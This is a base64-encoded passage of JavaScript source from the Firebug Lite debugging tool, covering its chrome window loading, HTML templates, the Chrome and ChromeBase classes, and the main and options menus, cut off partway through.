ICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIG9uQ2hyb21lTG9hZCA9IGZ1bmN0aW9uIG9uQ2hyb21lTG9hZChjaHJvbWUpDQp7DQogICAgRW52LmNocm9tZSA9IGNocm9tZTsNCiAgICANCiAgICBpZiAoRkJUcmFjZS5EQkdfSU5JVElBTElaRSkgRkJUcmFjZS5zeXNvdXQoIkNocm9tZSBvbkNocm9tZUxvYWQiLCAiY2hyb21lIHdpbmRvdyBsb2FkZWQiKTsNCiAgICANCiAgICBpZiAoRW52Lk9wdGlvbnMuZW5hYmxlUGVyc2lzdGVudCkNCiAgICB7DQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIHBlcnNpc3QgLSBtYWtlIGJldHRlciBjaHJvbWUgc3luY2hyb25pemF0aW9uIHdoZW4gaW4gcGVyc2lzdGVudCBtb2RlDQogICAgICAgIEVudi5GaXJlYnVnQ2hyb21lID0gRmlyZWJ1Z0Nocm9tZTsNCiAgICAgICAgDQogICAgICAgIGNocm9tZS53aW5kb3cuRmlyZWJ1ZyA9IGNocm9tZS53aW5kb3cuRmlyZWJ1ZyB8fCB7fTsNCiAgICAgICAgY2hyb21lLndpbmRvdy5GaXJlYnVnLlNoYXJlZEVudiA9IEVudjsNCiAgICAgICAgDQogICAgICAgIGlmIChFbnYuaXNEZXZlbG9wbWVudE1vZGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIEVudi5icm93c2VyLndpbmRvdy5GQkRldi5sb2FkQ2hyb21lQXBwbGljYXRpb24oY2hyb21lKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBkb2MgPSBjaHJvbWUuZG9jdW1lbnQ7DQogICAgICAgICAgICB2YXIgc2NyaXB0ID0gZG9jLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOw0KICAgICAgICAgICAgc2NyaXB0LnNyYyA9IEVudi5Mb2NhdGlvbi5hcHAgKyAiI3JlbW90ZSxwZXJzaXN0IjsNCiAgICAgICAgICAgIGRvYy5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLmFwcGVuZENoaWxkKHNjcmlwdCk7DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgaWYgKGNocm9tZS50eXBlID09ICJmcmFtZSIgfHwgY2hyb21lLnR5cGUgPT0gImRpdiIpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIGluaXRpYWxpemUgdGhlIGNocm9tZSBhcHBsaWNhdGlvbg0KICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgICAgICAgIEZCTC5GaXJlYnVnLmluaXRpYWxpemUoKTsNCiAgICAgICAgICAgIH0sMCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAoY2hyb21lLnR5cGUgPT0gInBvcHVwIikNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG9sZENocm9tZSA9IEZpcmVidWdDaHJvbWUuY2hyb21lTWFwLmZyYW1lOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgbmV3Q2hyb21lID0gbmV3IENocm9tZShjaHJvbWUpOw0KICAgICAgICANCiAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIHN5bmMgZGV0YWNoIHJlYXR0YWNoIGF0dGFjaA0KICAgICAgICAgICAgZGlzcGF0Y2gobmV3Q2hyb21lLnBhbmVsTWFwLCAiZGV0YWNoIiwgW29sZENocm9tZSwgbmV3Q2hyb21lXSk7DQogICAgICAgIA0KICAgICAgICAgICAgbmV3Q2hyb21lLnJlYXR0YWNoKG9sZENocm9tZSwgbmV3Q2hyb21lKTsNCiAgICAgICAgfQ0KICAgIH0NCn07DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnZhciBnZXRDaHJvbWVEaXZUZW1wbGF0ZSA9IGZ1bmN0aW9uKCkNCnsNCiAgICByZXR1cm4gRmlyZWJ1Z0Nocm9tZS5Ta2luLkhUTUw7DQp9Ow0KDQp2YXIgZ2V0Q2hyb21lVGVtcGxhdGUgPSBmdW5jdGlvbihpc1BvcHVwKQ0Kew0KICAgIHZhciB0cGwgPSBGaXJlYnVnQ2hyb21lLlNraW47IA0KICAgIHZhciByID0gW10sIGkgPSAtMTsNCiAgICANCiAgICByWysraV0gPSAnPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvRFREL3N0cmljdC5kdGQiPic7DQogICAgclsrK2ldID0gJzxodG1sPjxoZWFkPjx0aXRsZT4nOw0KICAgIHJbKytpXSA9IEZpcmVidWcudmVyc2lvbjsNCiAgICANCiAgICAvKg0KICAgIHJbKytpXSA9ICc8L3RpdGxlPjxsaW5rIGhyZWY9Iic7DQogICAgclsrK2ldID0gRW52LkxvY2F0aW9uLnNraW5EaXIgKyAnZmlyZWJ1Zy5jc3MnOw0KICAgIHJbKytpXSA9ICciIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+JzsNCiAgICAvKiovDQogICAgDQogICAgclsrK2ldID0gJzwvdGl0bGU+PHN0eWxlPmh0bWwsYm9keXttYXJnaW46MDtwYWRkaW5nOjA7b3ZlcmZsb3c6aGlkZGVuO30nOw0KICAgIHJbKytpXSA9IHRwbC5DU1M7DQogICAgclsrK2ldID0gJzwvc3R5bGU+JzsNCiAgICAvKiovDQogICAgDQogICAgclsrK2ldID0gJzwvaGVhZD48Ym9keSBjbGFzcz0iZmJCb2R5JyArIChpc1BvcHVwID8gJyBGaXJlYnVnUG9wdXAnIDogJycpICsgJyI+JzsNCiAgICByWysraV0gPSB0cGwuSFRNTDsNCiAgICByWysraV0gPSAnPC9ib2R5PjwvaHRtbD4nOw0KICAgIA0KICAgIHJldHVybiByLmpvaW4oIiIpOw0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENocm9tZSBDbGFzcw0KICAgIA0KLyoqQGNsYXNzKi8NCnZhciBDaHJvbWUgPSBmdW5jdGlvbiBDaHJvbWUoY2hyb21lKQ0Kew0KICAgIHZhciB0eXBlID0gY2hyb21lLnR5cGU7DQogICAgdmFyIEJhc2UgPSB0eXBlID09ICJmcmFtZSIgfHwgdHlwZSA9PSAiZGl2IiA/IENocm9tZUZyYW1lQmFzZSA6IENocm9tZVBvcHVwQmFzZTsgDQogICAgDQogICAgYXBwZW5kKHRoaXMsIEJhc2UpOyAgIC8vIGluaGVyaXQgZnJvbSBiYXNlIGNsYXNzIChDaHJvbWVGcmFtZUJhc2Ugb3IgQ2hyb21lUG9wdXBCYXNlKQ0KICAgIGFwcGVuZCh0aGlzLCBjaHJvbWUpOyAvLyBpbmhlcml0IGNocm9tZSB3aW5kb3cgcHJvcGVydGllcw0KICAgIGFwcGVuZCh0aGlzLCBuZXcgQ29udGV4dChjaHJvbWUud2luZG93KSk7IC8vIGluaGVyaXQgZnJvbSBDb250ZXh0IGNsYXNzDQogICAgDQogICAgRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXBbdHlwZV0gPSB0aGlzOw0KICAgIEZpcmVidWcuY2hyb21lID0gdGhpczsNCiAgICBFbnYuY2hyb21lID0gY2hyb21lLndpbmRvdzsNCiAgICANCiAgICB0aGlzLmNvbW1hbmRMaW5lVmlzaWJsZSA9IGZhbHNlOw0KICAgIHRoaXMuc2lkZVBhbmVsVmlzaWJsZSA9IGZhbHNlOw0KICAgIA0KICAgIHRoaXMuY3JlYXRlKCk7DQogICAgDQogICAgcmV0dXJuIHRoaXM7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENocm9tZUJhc2UNCg0KLyoqDQogKiBAbmFtZXNwYWNlDQogKiBAZXh0ZW5kcyBGQkwuQ29udHJvbGxlciANCiAqIEBleHRlbmRzIEZCTC5QYW5lbEJhciANCiAqKi8NCnZhciBDaHJvbWVCYXNlID0ge307DQphcHBlbmQoQ2hyb21lQmFzZSwgQ29udHJvbGxlcik7IA0KYXBwZW5kKENocm9tZUJhc2UsIFBhbmVsQmFyKTsNCmFwcGVuZChDaHJvbWVCYXNlLA0KLyoqQGV4dGVuZCBucy1jaHJvbWUtQ2hyb21lQmFzZSovDQp7DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIGluaGVyaXRlZCBwcm9wZXJ0aWVzDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBpbmhlcml0ZWQgZnJvbSBjcmVhdGVDaHJvbWUgZnVuY3Rpb24NCiAgICANCiAgICBub2RlOiBudWxsLA0KICAgIHR5cGU6IG51bGwsDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBpbmhlcml0ZWQgZnJvbSBDb250ZXh0LnByb3RvdHlwZQ0KICAgIA0KICAgIGRvY3VtZW50OiBudWxsLA0KICAgIHdpbmRvdzogbnVsbCwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gdmFsdWUgcHJvcGVydGllcw0KICAgIA0KICAgIHNpZGVQYW5lbFZpc2libGU6IGZhbHNlLA0KICAgIGNvbW1hbmRMaW5lVmlzaWJsZTogZmFsc2UsDQogICAgbGFyZ2VDb21tYW5kTGluZVZpc2libGU6IGZhbHNlLA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBvYmplY3QgcHJvcGVydGllcw0KICAgIA0KICAgIGluc3BlY3RCdXR0b246IG51bGwsDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGNyZWF0ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgUGFuZWxCYXIuY3JlYXRlLmNhbGwodGhpcyk7DQogICAgICAgIA0KICAgICAgICBpZiAoRmlyZWJ1Zy5JbnNwZWN0b3IpDQogICAgICAgICAgICB0aGlzLmluc3BlY3RCdXR0b24gPSBuZXcgQnV0dG9uKHsNCiAgICAgICAgICAgICAgICB0eXBlOiAidG9nZ2xlIiwNCiAgICAgICAgICAgICAgICBlbGVtZW50OiAkKCJmYkNocm9tZV9idEluc3BlY3QiKSwNCiAgICAgICAgICAgICAgICBvd25lcjogRmlyZWJ1Zy5JbnNwZWN0b3IsDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgb25QcmVzczogRmlyZWJ1Zy5JbnNwZWN0b3Iuc3RhcnRJbnNwZWN0aW5nLA0KICAgICAgICAgICAgICAgIG9uVW5wcmVzczogRmlyZWJ1Zy5JbnNwZWN0b3Iuc3RvcEluc3BlY3RpbmcgICAgICAgICAgDQogICAgICAgICAgICB9KTsNCiAgICB9LA0KICAgIA0KICAgIGRlc3Ryb3k6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmKEZpcmVidWcuSW5zcGVjdG9yKQ0KICAgICAgICAgICAgdGhpcy5pbnNwZWN0QnV0dG9uLmRlc3Ryb3koKTsNCiAgICAgICAgDQogICAgICAgIFBhbmVsQmFyLmRlc3Ryb3kuY2FsbCh0aGlzKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuc2h1dGRvd24oKTsNCiAgICB9LA0KICAgIA0KICAgIHRlc3RNZW51OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB2YXIgZmlyZWJ1Z01lbnUgPSBuZXcgTWVudSgNCiAgICAgICAgew0KICAgICAgICAgICAgaWQ6ICJmYkZpcmVidWdNZW51IiwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaXRlbXM6DQogICAgICAgICAgICBbDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBsYWJlbDogIk9wZW4gRmlyZWJ1ZyIsDQogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJzaG9ydGN1dCIsDQogICAgICAgICAgICAgICAgICAgIGtleTogaXNGaXJlZm94ID8gIlNoaWZ0K0YxMiIgOiAiRjEyIiwNCiAgICAgICAgICAgICAgICAgICAgY2hlY2tlZDogdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogInRvZ2dsZUNocm9tZSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgbGFiZWw6ICJPcGVuIEZpcmVidWcgaW4gTmV3IFdpbmRvdyIsDQogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJzaG9ydGN1dCIsDQogICAgICAgICAgICAgICAgICAgIGtleTogaXNGaXJlZm94ID8gIkN0cmwrU2hpZnQrRjEyIiA6ICJDdHJsK0YxMiIsDQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICJvcGVuUG9wdXAiDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGxhYmVsOiAiSW5zcGVjdCBFbGVtZW50IiwNCiAgICAgICAgICAgICAgICAgICAgdHlwZTogInNob3J0Y3V0IiwNCiAgICAgICAgICAgICAgICAgICAga2V5OiAiQ3RybCtTaGlmdCtDIiwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogInRvZ2dsZUluc3BlY3QiDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGxhYmVsOiAiQ29tbWFuZCBMaW5lIiwNCiAgICAgICAgICAgICAgICAgICAgdHlwZTogInNob3J0Y3V0IiwNCiAgICAgICAgICAgICAgICAgICAga2V5OiAiQ3RybCtTaGlmdCtMIiwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogImZvY3VzQ29tbWFuZExpbmUiDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAiLSIsDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBsYWJlbDogIk9wdGlvbnMiLA0KICAgICAgICAgICAgICAgICAgICB0eXBlOiAiZ3JvdXAiLA0KICAgICAgICAgICAgICAgICAgICBjaGlsZDogImZiRmlyZWJ1Z09wdGlvbnNNZW51Ig0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgIi0iLA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgbGFiZWw6ICJGaXJlYnVnIExpdGUgV2Vic2l0ZS4uLiIsDQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICJ2aXNpdFdlYnNpdGUiDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGxhYmVsOiAiRGlzY3Vzc2lvbiBHcm91cC4uLiIsDQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICJ2aXNpdERpc2N1c3Npb25Hcm91cCINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgbGFiZWw6ICJJc3N1ZSBUcmFja2VyLi4uIiwNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogInZpc2l0SXNzdWVUcmFja2VyIg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIF0sDQogICAgICAgICAgICANCiAgICAgICAgICAgIG9uSGlkZTogZnVuY3Rpb24oKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGljb25CdXR0b24ucmVzdG9yZSgpOw0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdG9nZ2xlQ2hyb21lOiBmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUudG9nZ2xlKCk7DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgDQogICAgICAgICAgICBvcGVuUG9wdXA6IGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBGaXJlYnVnLmNocm9tZS50b2dnbGUodHJ1ZSwgdHJ1ZSk7DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgDQogICAgICAgICAgICB0b2dnbGVJbnNwZWN0OiBmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5JbnNwZWN0b3IudG9nZ2xlSW5zcGVjdCgpOw0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZm9jdXNDb21tYW5kTGluZTogZnVuY3Rpb24oKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmZvY3VzQ29tbWFuZExpbmUoKTsNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICANCiAgICAgICAgICAgIHZpc2l0V2Vic2l0ZTogZnVuY3Rpb24oKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMudmlzaXQoImh0dHA6Ly9nZXRmaXJlYnVnLmNvbS9saXRlLmh0bWwiKTsNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICANCiAgICAgICAgICAgIHZpc2l0RGlzY3Vzc2lvbkdyb3VwOiBmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy52aXNpdCgiaHR0cDovL2dyb3Vwcy5nb29nbGUuY29tL2dyb3VwL2ZpcmVidWciKTsNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICANCiAgICAgICAgICAgIHZpc2l0SXNzdWVUcmFja2VyOiBmdW5jdGlvbigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy52aXNpdCgiaHR0cDovL2NvZGUuZ29vZ2xlLmNvbS9wL2ZidWcvaXNzdWVzL2xpc3QiKTsNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICANCiAgICAgICAgICAgIHZpc2l0OiBmdW5jdGlvbih1cmwpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgd2luZG93Lm9wZW4odXJsKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICB9KTsNCiAgICAgICAgDQogICAgICAgIC8qKkBwcml2YXRlKi8NCiAgICAgICAgdmFyIGZpcmVidWdPcHRpb25zTWVudSA9DQogICAgICAgIHsNCiAgICAgICAgICAgIGlkOiAiZmJGaXJlYnVnT3B0aW9uc01lbnUiLA0KICAgICAgICAgICAgDQogICAgICAgICAgICBnZXRJdGVtczogZnVuY3Rpb24oKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBjb29raWVzRGlzYWJsZWQgPSAhRmlyZWJ1Zy5zYXZlQ29va2llczsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXR1cm4gWw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBsYWJlbDogIlN0YXJ0IE9wZW5lZCIsDQogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAiY2hlY2tib3giLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6ICJzdGFydE9wZW5lZCIsDQogICAgICAgICAgICAgICAgICAgICAgICBjaGVja2VkOiBGaXJlYnVnLnN0YXJ0T3BlbmVkLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWQ6IGNvb2tpZXNEaXNhYmxlZA0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBsYWJlbDogIlN0YXJ0IGluIE5ldyBXaW5kb3ciLA0KICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogImNoZWNrYm94IiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiAic3RhcnRJbk5ld1dpbmRvdyIsDQogICAgICAgICAgICAgICAgICAgICAgICBjaGVja2VkOiBGaXJlYnVnLnN0YXJ0SW5OZXdXaW5kb3csDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZDogY29va2llc0Rpc2FibGVkDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhYmVsOiAiU2hvdyBJY29uIFdoZW4gSGlkZGVuIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICJjaGVja2JveCIsDQogICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogInNob3dJY29uV2hlbkhpZGRlbiIsDQogICAgICAgICAgICAgICAgICAgICAgICBjaGVja2VkOiBGaXJlYnVnLnNob3dJY29uV2hlbkhpZGRlbiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkOiBjb29raWVzRGlzYWJsZWQNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgbGFiZWw6ICJPdmVycmlkZSBDb25zb2xlIE9iamVjdCIsDQogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAiY2hlY2tib3giLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6ICJvdmVycmlkZUNvbnNvbGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2tlZDogRmlyZWJ1Zy5vdmVycmlkZUNvbnNvbGUsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZDogY29va2llc0Rpc2FibGVkDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhYmVsOiAiSWdub3JlIEZpcmVidWcgRWxlbWVudHMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogImNoZWNrYm94IiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiAiaWdub3JlRmlyZWJ1Z0VsZW1lbnRzIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrZWQ6IEZpcmVidWcuaWdub3JlRmlyZWJ1Z0VsZW1lbnRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWQ6IGNvb2tpZXNEaXNhYmxlZA0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBsYWJlbDogIkRpc2FibGUgV2hlbiBGaXJlYnVnIEFjdGl2ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAiY2hlY2tib3giLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6ICJkaXNhYmxlV2hlbkZpcmVidWdBY3RpdmUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2tlZDogRmlyZWJ1Zy5kaXNhYmxlV2hlbkZpcmVidWdBY3RpdmUsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZDogY29va2llc0Rpc2FibGVkDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhYmVsOiAiRGlzYWJsZSBYSFIgTGlzdGVuZXIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogImNoZWNrYm94IiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiAiZGlzYWJsZVhIUkxpc3RlbmVyIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrZWQ6IEZpcmVidWcuZGlzYWJsZVhIUkxpc3RlbmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWQ6IGNvb2tpZXNEaXNhYmxlZA0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBsYWJlbDogIkRpc2FibGUgUmVzb3VyY2UgRmV0Y2hpbmciLA0KICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogImNoZWNrYm94IiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiAiZGlzYWJsZVJlc291cmNlRmV0Y2hpbmciLA0KICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2tlZDogRmlyZWJ1Zy5kaXNhYmxlUmVzb3VyY2VGZXRjaGluZywNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkOiBjb29raWVzRGlzYWJsZWQNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgbGFiZWw6ICJFbmFibGUgVHJhY2UgTW9kZSIsDQogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAiY2hlY2tib3giLA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU6ICJlbmFibGVUcmFjZSIsDQogICAgICAgICAgICAgICAgICAgICAgICBjaGVja2VkOiBGaXJlYnVnLmVuYWJsZVRyYWNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWQ6IGNvb2tpZXNEaXNhYmxlZA0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBsYWJlbDogIkVuYWJsZSBQZXJzaXN0ZW50IE1vZGUgKGV4cGVyaW1lbnRhbCkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogImNoZWNrYm94IiwNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiAiZW5hYmxlUGVyc2lzdGVudCIsDQogICAgICAgICAgICAgICAgICAgICAgICBjaGVja2VkOiBGaXJlYnVnLmVuYWJsZVBlcnNpc3RlbnQsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZDogY29va2llc0Rpc2FibGVkDQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgbGFiZWw6ICJSZXNldCBBbGwgRmlyZWJ1ZyBPcHRpb25zIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICJyZXN0b3JlUHJlZnMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWQ6IGNvb2tpZXNEaXNhYmxlZA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgXTsNCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICANCiAgICAgICAgICAgIG9uQ2hlY2s6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUsIGNoZWNrZWQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5zZXRQcmVmKHZhbHVlLCBjaGVja2VkKTsNCiAgICAgICAgICAgIH0sICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmVzdG9yZVByZWZzOiBmdW5jdGlvbih0YXJnZXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5lcmFzZVByZWZzKCk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHRhcmdldCkNCiAgICAgICAgICAgICAgICAgICAgdGhpcy51cGRhdGVNZW51KHRhcmdldCk7DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgDQogICAgICAgICAgICB1cGRhdGVNZW51OiBmdW5jdGlvbih0YXJnZXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIG9wdGlvbnMgPSBnZXRFbGVtZW50c0J5Q2xhc3ModGFyZ2V0LnBhcmVudE5vZGUsICJmYk1lbnVPcHRpb24iKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgZmlyc3RPcHRpb24gPSBvcHRpb25zWzBdOyANCiAgICAgICAgICAgICAgICB2YXIgZW5hYmxlZCA9IEZpcmVidWcuc2F2ZUNvb2tpZXM7DQogICAgICAgICAgICAgICAgaWYgKGVuYWJsZWQpDQogICAgICAgICAgICAgICAgICAgIE1lbnUuY2hlY2soZmlyc3RPcHRpb24pOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgTWVudS51bmNoZWNrKGZpcnN0T3B0aW9uKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoZW5hYmxlZCkNCiAg